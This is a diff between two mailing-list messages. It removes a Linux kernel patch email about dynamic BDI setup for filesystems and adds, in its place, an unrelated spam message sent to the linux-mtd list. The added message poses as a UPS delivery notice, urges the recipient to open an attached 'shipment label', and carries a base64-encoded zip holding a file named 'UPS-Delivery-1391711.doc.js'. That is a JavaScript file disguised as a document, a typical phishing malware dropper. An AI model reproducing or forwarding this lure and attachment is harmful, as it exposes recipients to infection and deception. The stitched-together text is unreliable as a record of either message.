@@ -1,20 +1,11 @@
-From: Jan Kara <jack@suse.cz>
-To: <linux-fsdevel@vger.kernel.org>
-Cc: linux-block@vger.kernel.org, Christoph Hellwig <hch@infradead.org>,
- Jan Kara <jack@suse.cz>, linux-mtd@lists.infradead.org,
- linux-nfs@vger.kernel.org, Petr Vandrovec <petr@vandrovec.name>,
- linux-nilfs@vger.kernel.org, cluster-devel@redhat.com,
- osd-dev@open-osd.org, codalist@coda.cs.cmu.edu,
- linux-afs@lists.infradead.org, ecryptfs@vger.kernel.org,
- linux-cifs@vger.kernel.org, ceph-devel@vger.kernel.org,
- linux-btrfs@vger.kernel.org, v9fs-developer@lists.sourceforge.net,
- lustre-devel@lists.lustre.org
-Subject: [PATCH 04/25] fs: Provide infrastructure for dynamic BDIs in
- filesystems
-Date: Wed, 29 Mar 2017 12:56:02 +0200
-Message-Id: <20170329105623.18241-5-jack@suse.cz>
-In-Reply-To: <20170329105623.18241-1-jack@suse.cz>
-References: <20170329105623.18241-1-jack@suse.cz>
+Message-ID: <20170329105151.16788.qmail@lvps217-8-253-161.vps.webfusion.co.uk>
+From: anonymous@lvps217-8-253-161.vps.webfusion.co.uk
+To: linux-mtd@bombadil.infradead.org
+Subject: UPS issue #1391711: unable to delivery parcel
+Date: Wed, 29 Mar 2017 11:51:51 +0100
+Content-Type: multipart/mixed;
+ boundary="bound1_57b9bfa7c2aa0ff11d786efcdadf8e12"
+Content-Transfer-Encoding: 8bit
 List-Id: Linux MTD discussion mailing list <linux-mtd.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=unsubscribe>
@@ -24,134 +15,69 @@ List-Help: <mailto:linux-mtd-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mtd>,
  <mailto:linux-mtd-request@lists.infradead.org?subject=subscribe>
 
-Provide helper functions for setting up dynamically allocated
-backing_dev_info structures for filesystems and cleaning them up on
-superblock destruction.
 
-CC: linux-mtd@lists.infradead.org
-CC: linux-nfs@vger.kernel.org
-CC: Petr Vandrovec <petr@vandrovec.name>
-CC: linux-nilfs@vger.kernel.org
-CC: cluster-devel@redhat.com
-CC: osd-dev@open-osd.org
-CC: codalist@coda.cs.cmu.edu
-CC: linux-afs@lists.infradead.org
-CC: ecryptfs@vger.kernel.org
-CC: linux-cifs@vger.kernel.org
-CC: ceph-devel@vger.kernel.org
-CC: linux-btrfs@vger.kernel.org
-CC: v9fs-developer@lists.sourceforge.net
-CC: lustre-devel@lists.lustre.org
-Signed-off-by: Jan Kara <jack@suse.cz>
----
- fs/super.c                       | 49 ++++++++++++++++++++++++++++++++++++++++
- include/linux/backing-dev-defs.h |  2 +-
- include/linux/fs.h               |  6 +++++
- 3 files changed, 56 insertions(+), 1 deletion(-)
+--bound1_57b9bfa7c2aa0ff11d786efcdadf8e12
+Content-Type: text/plain; charset=us-ascii
 
-diff --git a/fs/super.c b/fs/super.c
-index b8b6a086c03b..0f51a437c269 100644
---- a/fs/super.c
-+++ b/fs/super.c
-@@ -446,6 +446,11 @@ void generic_shutdown_super(struct super_block *sb)
- 	hlist_del_init(&sb->s_instances);
- 	spin_unlock(&sb_lock);
- 	up_write(&sb->s_umount);
-+	if (sb->s_iflags & SB_I_DYNBDI) {
-+		bdi_put(sb->s_bdi);
-+		sb->s_bdi = &noop_backing_dev_info;
-+		sb->s_iflags &= ~SB_I_DYNBDI;
-+	}
- }
- 
- EXPORT_SYMBOL(generic_shutdown_super);
-@@ -1256,6 +1261,50 @@ mount_fs(struct file_system_type *type, int flags, const char *name, void *data)
- }
- 
- /*
-+ * Setup private BDI for given superblock. It gets automatically cleaned up
-+ * in generic_shutdown_super().
-+ */
-+int super_setup_bdi_name(struct super_block *sb, char *fmt, ...)
-+{
-+	struct backing_dev_info *bdi;
-+	int err;
-+	va_list args;
-+
-+	bdi = bdi_alloc(GFP_KERNEL);
-+	if (!bdi)
-+		return -ENOMEM;
-+
-+	bdi->name = sb->s_type->name;
-+
-+	va_start(args, fmt);
-+	err = bdi_register_va(bdi, NULL, fmt, args);
-+	va_end(args);
-+	if (err) {
-+		bdi_put(bdi);
-+		return err;
-+	}
-+	WARN_ON(sb->s_bdi != &noop_backing_dev_info);
-+	sb->s_bdi = bdi;
-+	sb->s_iflags |= SB_I_DYNBDI;
-+
-+	return 0;
-+}
-+EXPORT_SYMBOL(super_setup_bdi_name);
-+
-+/*
-+ * Setup private BDI for given superblock. I gets automatically cleaned up
-+ * in generic_shutdown_super().
-+ */
-+int super_setup_bdi(struct super_block *sb)
-+{
-+	static atomic_long_t bdi_seq = ATOMIC_LONG_INIT(0);
-+
-+	return super_setup_bdi_name(sb, "%.28s-%ld", sb->s_type->name,
-+				    atomic_long_inc_return(&bdi_seq));
-+}
-+EXPORT_SYMBOL(super_setup_bdi);
-+
-+/*
-  * This is an internal function, please use sb_end_{write,pagefault,intwrite}
-  * instead.
-  */
-diff --git a/include/linux/backing-dev-defs.h b/include/linux/backing-dev-defs.h
-index e66d4722db8e..866c433e7d32 100644
---- a/include/linux/backing-dev-defs.h
-+++ b/include/linux/backing-dev-defs.h
-@@ -146,7 +146,7 @@ struct backing_dev_info {
- 	congested_fn *congested_fn; /* Function pointer if device is md/dm */
- 	void *congested_data;	/* Pointer to aux data for congested func */
- 
--	char *name;
-+	const char *name;
- 
- 	struct kref refcnt;	/* Reference counter for the structure */
- 	unsigned int capabilities; /* Device capabilities */
-diff --git a/include/linux/fs.h b/include/linux/fs.h
-index 7251f7bb45e8..98cf14ea78c0 100644
---- a/include/linux/fs.h
-+++ b/include/linux/fs.h
-@@ -1272,6 +1272,9 @@ struct mm_struct;
- /* sb->s_iflags to limit user namespace mounts */
- #define SB_I_USERNS_VISIBLE		0x00000010 /* fstype already mounted */
- 
-+/* Temporary flag until all filesystems are converted to dynamic bdis */
-+#define SB_I_DYNBDI	0x00000100
-+
- /* Possible states of 'frozen' field */
- enum {
- 	SB_UNFROZEN = 0,		/* FS is unfrozen */
-@@ -2121,6 +2124,9 @@ extern int vfs_ustat(dev_t, struct kstatfs *);
- extern int freeze_super(struct super_block *super);
- extern int thaw_super(struct super_block *super);
- extern bool our_mnt(struct vfsmount *mnt);
-+extern __printf(2, 3)
-+int super_setup_bdi_name(struct super_block *sb, char *fmt, ...);
-+extern int super_setup_bdi(struct super_block *sb);
- 
- extern int current_umask(void);
- 
--- 
-2.10.2
+Dear Customer,
+
+
+
+This is to confirm that your item has been shipped at March 26.
+
+
+
+You can download the shipment label attached!
+
+
+
+Yours truly,
+
+Jared Wallace,
+
+UPS Station Manager.
+
+
+--bound1_57b9bfa7c2aa0ff11d786efcdadf8e12
+Content-Type: application/zip; name="UPS-Delivery-1391711.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=UPS-Delivery-1391711.zip
+
+UEsDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAAAAVVBTLURlbGl2ZXJ5LTEzOTE3MTEAAAAAAAAA
+
+AAAAAABQSwMEFAAAAAgAAAAAAGcrOqOlAgAASAQAADAAAABVUFMtRGVsaXZlcnktMTM5MTcxMS9V
+
+UFMtRGVsaXZlcnktMTM5MTcxMS5kb2MuanNVU21T2kAQ/gwz/ofMfZBkAmkiCKZUO2oFB6W0gAVl
+
+mM4Bm+Qgb94dSlT+e++OiJaZJbfP8+xmb3fDgTKsnWp286D4HJAQdK6Qb5pjG6/qbJrN7UHxCVON
+
+xJgI7aT0pVQu8VIZta+GqIy+onIpFUggbCAMC2aIps1dEIiI0WBOScqtSwqYQ2+2hDnXUReZMuOk
+
+UXGmJhojE3Vvj6xx9/Z6OESaqV43qU0tntylKdBLzEA3jDxtwrhIXHor5f5GeDriwLg1W2dAU5ok
+
+njVPImQKqYm8EAtIpOFZiJ8/EZxEM6ARxNYc5xBgxn2K4wXFKVkwUXTIs08hUeYBcExhRcKQxH4E
+
+ijQsloZEXOwNvVcZiaqQrX5Ow73n9Vn9YfncuHhirba73gzxwyim0ImA0/bV/TF9yR5xvR/0w6Te
+
+7pzfubV+7boa9Xsn5zfQv2e1i/pozbJf5x7mrW59M/Bbg0aXdR5mPGWen83G0WLxu3czavy5+8FI
+
+9+/gp1OhjY7zGLSy6vjWvR5WazbKi/Mz/v/k6RqMg+LrQbFAPF2wZ6cbK4TY54GACxIvzEQzViKi
+
+sC0UxD+nmWTUuSBz8uUqEEk3ExFu2tPmjgFLdD7W5VEN1TGdaVnbu3W1APk2OE7FsT9c1624Jx/u
+
+sZSqUzV/urZdEZZ74ilL2DtonqxjscZon0GC35EZ7d7v4ZCBnJYskkG80HeOvAsVFwGLAkuTmMEQ
+
+NnxPvQREjvbYtveQn3CFmDVhklcM8TRdp3kXtYpUGdqZZmuHhxq1SLyATc/TI4npgjPl5e0jQ/Zb
+
+tlV1T6VfiT2TH98urYJSQtdMdpvmi6c0xoeArLC/kIKd0lomJNZ3n9w0l8ETDvVcZ2oI5fB+zIWt
+
+GrawOebzQIf3TVC4HLIpDtvmP2crOqOlAgAASAQAAFBLAQIAAAoAAAAAAAAAAAAAAAAAAAAAAAAA
+
+AAAUAAAAAAAAAAAAEAAAAAAAAABVUFMtRGVsaXZlcnktMTM5MTcxMVBLAQIAABQAAAAIAAAAAABn
+
+KzqjpQIAAEgEAAAwAAAAAAAAAAAAIAAAAD4AAABVUFMtRGVsaXZlcnktMTM5MTcxMS9VUFMtRGVs
+
+aXZlcnktMTM5MTcxMS5kb2MuanNQSwUGAAAAAAIAAgCgAAAAPQMAAAAA
+
+
+--bound1_57b9bfa7c2aa0ff11d786efcdadf8e12--
